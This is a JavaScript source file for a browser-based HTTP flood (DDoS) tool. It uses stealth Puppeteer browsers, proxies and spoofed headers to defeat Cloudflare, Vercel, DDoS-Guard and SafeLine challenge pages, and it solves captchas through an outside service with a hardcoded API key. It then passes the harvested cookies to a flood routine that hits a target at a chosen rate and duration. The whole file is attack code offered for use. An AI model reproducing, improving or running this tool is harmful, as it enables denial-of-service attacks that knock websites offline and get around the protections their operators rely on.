const async = require("async");
const axios = require('axios');
const fs = require("fs")
const os = require('os');
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const puppeteerAnonymize = require("puppeteer-extra-plugin-anonymize-ua");
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
const resemble = require('resemblejs');
const flood = require('./flood');
const { checkTurnstile } = require('./turnstile');
const mouser = require('./mouser');

var HeadersBrowser = '';
let startTime = '';
const stealthPlugin = puppeteerStealth();
const anonymizePlugin = puppeteerAnonymize();
puppeteer.use(stealthPlugin);
puppeteer.use(anonymizePlugin);
puppeteer.use(AdblockerPlugin({ blockTrackers: true }));

if (process.argv.includes('-h') || process.argv.includes('--help')) {
  console.log(`
Usage: node browsern.js <host> <duration> <rates> [options]
Puppeteer runs a Chrome browser with stealth plugins.
Coded by @udpboy | Browsern v3.14

Arguments:
  <host>                 Target host (e.g., http://example.com)
  <duration>             Attack duration (seconds)
  <rates>                Requests rate per second

Options:
  --cuscaptcha <custom>      Custom captcha solving method (e.g., .button1) [default: none]
  --dratelimit <true/false>  Automating ratelimit detection [default: false]
  --headers <type>           Extra headers types (basic, undetect) [default: none]
  --headless <mode>          Headless mode (legacy, new, true/false) [default: new]
  --proxy <file>             Path to proxy list file (e.g., proxies.txt)
  -h, --help                 Display help and usage instructions

Bypasses:
  - Cloudflare UAM, Interactive Challenge,
     Custom Page Interactive Challenge
  - Vercel Attack Challenge Mode
  - DDoS-Guard JS Challenge & Click Challenge
  - SafeLine JS Challenge & Captcha

Example:
  node browsern.js http://captcha.count123.org 120 4 --proxy proxies.txt --headers undetect
  `);
  process.exit(0);
}

if (process.argv.length < 5) {
    console.error("Usage: node browsern.js <host> <duration> <rates> [options]");
    process.exit(1);
}

const host = process.argv[2];
const duration = process.argv[3];
const rates = process.argv[4];
const args = process.argv.slice(5);

const getArgValue = (name) => {
  const index = args.indexOf(name);
  return index !== -1 && args[index + 1] && !args[index + 1].startsWith('--') ? args[index + 1] : null;
};

const getArgFlag = (name) => args.includes(name);

const getArgValues = (name) => {
  const index = args.indexOf(name);
  if (index === -1) return [];
  const values = [];
  for (let i = index + 1; i < args.length; i++) {
    if (args[i].startsWith('--')) break;
    values.push(args[i]);
  }
  return values;
};

const cuscaptcha = getArgValue('--cuscaptcha');
const dratelimit = getArgFlag('--dratelimit');
const fingerprintArg = getArgValue('--fingerprint');
const headersArg = getArgValue('--headers');
const headlessArg = getArgValue('--headless');
const proxyFile = getArgValue('--proxy');

const headers_types = ['basic', 'undetect'];
const headlessModes = ['legacy', 'new', 'shell', 'true', 'false'];

if (headersArg && !headers_types.includes(headersArg)) {
  console.error(`[INFO] Invalid headers type(s): ${headersArg}`);
  console.error(`[INFO] Headers valid types: ${headers_types.join(', ')}`);
  process.exit(1);
}
if (headlessArg && !headlessModes.includes(headlessArg)) {
  console.error(`[INFO] Invalid headless mode: ${headlessArg}`);
  console.error(`[INFO] Valid modes: ${headlessModes.join(', ')}`);
  process.exit(1);
}

const headers = headersArg || false;
const headless = headlessArg || 'new';

const userAgents = [
'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Galaxy S22 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Xiaomi Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Realme GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Vivo X90 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; ASUS ROG Phone 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; Nothing Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
];

//const startTime = Date.now();
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));

const HeadersBasic = {
  'Accept-Encoding': 'gzip, deflate, br',
  'accept-language': 'en-US,en;q=0.9',
  'Connection': 'keep-alive',
  'DNT': '1',
  'sec-ch-ua-mobile': '?1',
  'Sec-Fetch-User': '?1',
  'Sec-Fetch-Mode': 'navigate',
  'Referer': host,
};

const HeadersUndetect = {
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'Accept-Encoding': 'gzip, deflate, br',
  'accept-language': 'en-US,en;q=0.9',
  'Connection': 'keep-alive',
  'DNT': '1',
  'sec-ch-ua-mobile': '?1',
  'Sec-Fetch-User': '?1',
  'Sec-Fetch-Mode': 'navigate',
  'sec-ch-ua-platform': 'Android',
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-Dest': 'document',
  'Referer': host,
};

async function CustomPageTurnstile(page) {
    let x;
    let y;
    const Turnstile = await page.$('.main-wrapper');
    await sleep(2.5);
    if (Turnstile) {
      try {
         console.log('[INFO] Detected protection ~ Cloudflare Custom Page Interactive Challenge');
         await mouser(page);
         const TurnstileBox = await Turnstile.boundingBox();
         x = TurnstileBox.x + TurnstileBox.width / 2;
         y = TurnstileBox.y + TurnstileBox.height / 2;
         await page.mouse.click(x, y);
         console.log('[DEBUG] Mouse clicked on TurnstileBox');
         await sleep(3);
      } catch (error) {
       console.log(`[ERROR] ${error}`);
      };
    };
};

async function JsChallenge(page) {
    const content = await page.content();
    const title = await page.evaluate(() => document.title);
    let x;
    let y;
    try {
       if (content.includes("https://waf.chaitin.com/challenge/v2/challenge.css")) {
         await page.mouse.move(650, 800, { steps: 18 });
         await page.mouse.move(400, 600, { steps: 15 });
         const captcha = await page.waitForSelector("#sl-check", { visible: true, timeout: 2000}).catch(() => null);
         if (captcha) {
           console.log('[INFO] Detected protection ~ SafeLine WAF Captcha');
           const captchabox = await captcha.boundingBox();
           x = captchabox.x + captchabox.width / 2;
           y = captchabox.y + captchabox.height / 2;
           await page.mouse.click(x, y, { delay: Math.floor(Math.random() * 40)});
           await sleep(2);
         } else {
          console.log('[INFO] Detected protection ~ SafeLine WAF JS Challenge');
          await mouser(page);
         };
       };

       if (['ddos-guard', 'DDoS-Guard', 'DDOS-GUARD'].includes(title)) {
         if (content.includes("/.well-known/ddos-guard/js-challenge/index.js")) {
           console.log('[INFO] Detected protection ~ DDoS-Guard JS Challenge');
           await sleep(4);
         };

         if (content.includes("/.well-known/ddos-guard/ddg-captcha-page/index.js")) {
           console.log('[INFO] Detected protection ~ DDoS-Guard Captcha');
           await DDGCaptcha(page);
           await sleep(2);
         };

         if (content.includes("/_guard/html.js?js=click_html")) {
           console.log('[INFO] Detected protection ~ DDoS-Guard Click Challenge');
           const click = await page.waitForSelector('.main #access', { visible: true, timeout: 5000 }).catch(() => null);
           if (click) {
             await page.click('.main #access');
             await sleep(4);
           };
         };
       };
    } catch (error) {
     console.log(`[ERROR] ${error}`);
    } finally {
     return;
    };
};

async function detectChallenge(browser, page) {
    const content = await page.content() ;
    if (content.includes("challenge-platform")) {
        try {
            await sleep(2.5);
            await mouser(page);
            const clx = 533;
            const cly = 289;
            startTime = Date.now();
            await page.screenshot({ path: '01.png',
              clip: { x: 503, y: 225,
                   width: 307, height: 125,
              },
            });

            const image1 = fs.readFileSync('01.png');
            const image2 = fs.readFileSync('./ex/captcha.png');
            const compareImages = (image1, image2) => {
              return new Promise((resolve, reject) => {
                resemble(image1)
                 .compareTo(image2)
                 .ignoreColors()
                 .onComplete((result) => {
                  const misMatch = parseFloat(result.misMatchPercentage);
                  if (misMatch === 0) {
                    resolve(true);
                  } else {
                   CustomPageTurnstile(page);
                   resolve(false);
                   return;
                  }
                 });
              });
            };
            const shouldProceed = await compareImages(image1, image2);
            if (!shouldProceed) return;
            console.log('[INFO] Detected protection ~ Cloudflare Interactive Challenge');
            const element = await page.$('body > div.main-wrapper > div > div > div > div');

            if (element) {
              const box = await element.boundingBox();
              await page.mouse.click(box.x + 30, box.y + 30);
            } else {
             console.log('[INFO] Element not found');
            }
            console.log('[DEBUG] Mouse clicked on TurnstileBox');
            await sleep(3);
            await JsChallenge(page);
        } catch (error) {
            console.log(`[ERROR] ${error}`);
        } finally {
            return;
        }
    }
}

async function DDGCaptcha(page) {
    let s = false;

    for (let j = 0; j < page.frames().length; j++) {
        const frame = page.frames()[j];
        const captchaStatt = await frame.evaluate(() => {
            if (
                document.querySelector("#ddg-challenge") &&
                document.querySelector("#ddg-challenge").getBoundingClientRect()
                    .height > 0
            ) {
                return true;
            }

            const captchaStatus = document.querySelector(".ddg-captcha__status");
            if (captchaStatus) {
                captchaStatus.click();
                return true;
            } else {
                return false;
            }
        });

        if (captchaStatt) {
            await sleep(3);

            const base64r = await frame.evaluate(async () => {
                const captchaImage = document.querySelector(
                    ".ddg-modal__captcha-image"
                );
                const getBase64StringFromDataURL = (dataURL) =>
                    dataURL.replace("data:", "").replace(/^.+,/, "");

                const width = captchaImage?.clientWidth;
                const height = captchaImage?.clientHeight;

                const canvas = document.createElement("canvas");
                canvas.width = width;
                canvas.height = height;

                canvas.getContext("2d").drawImage(captchaImage, 0, 0);
                const dataURL = canvas.toDataURL("image/jpeg", 0.5);
                const base64 = getBase64StringFromDataURL(dataURL);

                return base64;
            });

            if (base64r) {
                try {
                    console.log("[INFO] Detected protection ~ DDoS-Guard Captcha");
                    const response = await axios.post(
                        "https://api.nopecha.com/",
                        {
                            key: "g0lhe3gz24_RWC6JP3H",
                            type: "textcaptcha",
                            image_urls: [base64r],
                        },
                        {
                            headers: {
                                "Content-Type": "application/json",
                            },
                        }
                    );

                    const res = response.data;

                    const text = await new Promise((resCaptcha) => {
                        function get() {
                            axios.get("https://api.nopecha.com/", {
                                    params: {
                                        id: res.data,
                                        key: "g0lhe3gz24_RWC6JP3H",
                                    },
                                })
                                .then((res) => {
                                    if (res.data.error) {




	                                        setTimeout(get, 1000);
                                    } else {
                                        resCaptcha(res.data.data[0]);
                                    }
                                })
                                .catch((error) => { });
                        }
                        get();
                    });

                    s = text;

                    await frame.evaluate((text) => {
                        const captchaInput = document.querySelector(".ddg-modal__input");
                        const captchaSubmit = document.querySelector(".ddg-modal__submit");

                        captchaInput.value = text;
                        captchaSubmit.click();
                    }, text);
                    await sleep(6);
                    console.log("[INFO] DDoS-Guard Captcha bypassed");
                } catch (err) { }
            }
        }
    }
    return !!!s;
}

async function openBrowser(host, proxy = null) {
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const options = {
      headless: `${headless}`,
      args: [
          ...(proxy ? [`--proxy-server=${proxy}`] : []),
          "--no-sandbox",
          "--no-first-run",
          "--test-type",
          "--user-agent=" + userAgent,
          "--disable-browser-side-navigation",
          "--disable-extensions",
          "--disable-gpu",
          "--disable-dev-shm-usage",
          "--ignore-certificate-errors",
      ],
      ignoreHTTPSErrors: true,
      javaScriptEnabled: true,
    };
    if (headers === 'basic') {
      args.push("--disable-blink-features=AutomationControlled");
      args.push("--disable-features=IsolateOrigins,site-per-process");
      args.push("--disable-infobars");
      args.push("--hide-scrollbars");
    } else if (headers === 'undetect') {
     args.push("--disable-blink-features=AutomationControlled");
     args.push("--disable-features=IsolateOrigins,site-per-process");
     args.push("--disable-infobars");
     args.push("--hide-scrollbars");
     args.push("--disable-setuid-sandbox");
     args.push("--mute-audio");
     args.push("--no-zygote");
    };

    let browser;
    try {
        browser = await puppeteer.launch(options);
    } catch (error) {
        console.log(`[ERROR] Browser ${error}`);
        return;
    }
    try {
        const [page] = await browser.pages();
        const client = page._client();
        if (headers === 'basic') {
          await page.setExtraHTTPHeaders(HeadersBasic);
        } else if (headers === 'undetect'){
         await page.setExtraHTTPHeaders(HeadersUndetect);
        };
        const frameNavigatedHandler = (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
              if (frame._id) {
                client.send("Target.detachFromTarget", { targetId: frame._id }).catch(err => {
                 console.log(`[ERROR] Failed to detach from target: ${err.message}`);
                });
              } else {
               console.log("[INFO] Frame ID is not valid");
              }
            }
        };
        await page.on("framenavigated", frameNavigatedHandler);

        await page.setViewport({ width: 1920, height: 1200 });
        page.setDefaultNavigationTimeout(10000);

        const BrowserPage = await page.goto(host, { waitUntil: "domcontentloaded" });
	page.on('dialog', async dialog => {
          await dialog.accept();
        });

        console.log(`[INFO] Browser Opening Host Page ${host}`);
	const status = await BrowserPage.status();
        console.log(`[INFO] Status Code: ${status}`);
        const title = await page.evaluate(() => document.title);
        if (['Just a moment...', 'Checking your browser...', '安全检查中……', '?'].includes(title)) {
          console.log(`[INFO] Title: ${title}`);

          await page.on('response', async resp => {
            HeadersBrowser = resp.request().headers();
          });
          await detectChallenge(browser, page);
        } else if (['Vercel Security Checkpoint'].includes(title)) {
           console.log(`[INFO] Title: ${title}`);
           console.log(`[INFO] Detected protection ~ Vercel JS Challenge`);
           await sleep(3);
           const x = Math.floor(Math.random() * 800) + 100;
           const y = Math.floor(Math.random() * 600) + 100;
           await page.mouse.click(x, y, { delay: 40 });
           await mouser(page);
           await page.reload();
           await sleep(5);
           await page.mouse.click(x, y, { delay: 40 });
           await sleep(4);
        } else if (['安全验证'].includes(title)) {
           await mouser(page);
           await sleep(10);
        } else if (title === 'Attention Required! | Cloudflare') {
           console.log(`[INFO] Blocked by Cloudflare, Title ${title}`);
           await browser.close();
        } else {
         console.log(`[INFO] Title: ${title}`);
         await sleep(3);
         await JsChallenge(page);
         await CustomPageTurnstile(page);
        }
        const PageTitle = await page.title();
        console.log(`[INFO] Title Page: ${PageTitle}`);

        const cookies = await page.cookies();
        if (cookies.length > 0) {
          const _cookie = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
          console.log(`[INFO] UserAgent: ${userAgent}`);
          console.log(`[INFO] Cookies: ${_cookie}`);
        }
        return {
            title: PageTitle,
            headersall: HeadersBrowser,
            cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
            userAgent: userAgent,
            proxy: proxy,
        };
    } catch (error) {
        console.log(`[ERROR] ${error}`);
    } finally {
        await browser.close();
        await sleep(0.2);
    }
}

async function Start(host) {
  try {
     const response = await openBrowser(host);
     if (response) {
       if (['Just a moment...', 'Checking your browser...', '安全检查中……', 'Vercel Security Checkpoint', '安全验证'].includes(response.title)) {
         console.log("[INFO] Failed to bypass Cloudflare");
         await Start(host);
         return;
       }
       const elapsedTime = (Date.now() - startTime) / 1000;
       console.log(`[INFO] Bypass successful in ${elapsedTime} seconds`);
       const timeout = setTimeout(async () => {
         console.log(`[INFO] Stopping browser and flood process.`);
         process.exit(0);
         }, duration * 1000);
       if (proxyFile) {
         flood(host, duration, rates, response.userAgent, response.cookies, response.headersall, response.proxy);
       } else {
        flood(host, duration, rates, response.userAgent, response.cookies, response.headersall);
       }
     }
  } catch (error) {
    console.log(`[ERROR] ${error}`);
  }
}
async function checkProxy(proxy) {
  try {
    const [host, port] = proxy.split(':');
    const response = await axios.get('http://httpbin.org/ip', {
      proxy: {
        host: host,
        port: parseInt(port),
      },
      headers: {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
      },
      timeout: 5000
    });
    return response.status === 200;
  } catch (error) {
    console.log(`[INFO] Proxy ${proxy} is not active`);
    return false;
  }
}
async function RunWithProxy(proxyFile) {
  const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').map(line => line.trim());
  const fileContent = fs.readFileSync(proxyFile, 'utf-8');
  for (let proxy of proxies) {
    const isActive = await checkProxy(proxy);
    if (isActive) {
      console.log(`[INFO] Proxy ${proxy} active`);
      await Start(host, proxy);
      break;
    }
  }
}

if (proxyFile) {
  RunWithProxy(proxyFile);
} else {
  Start(host);
}
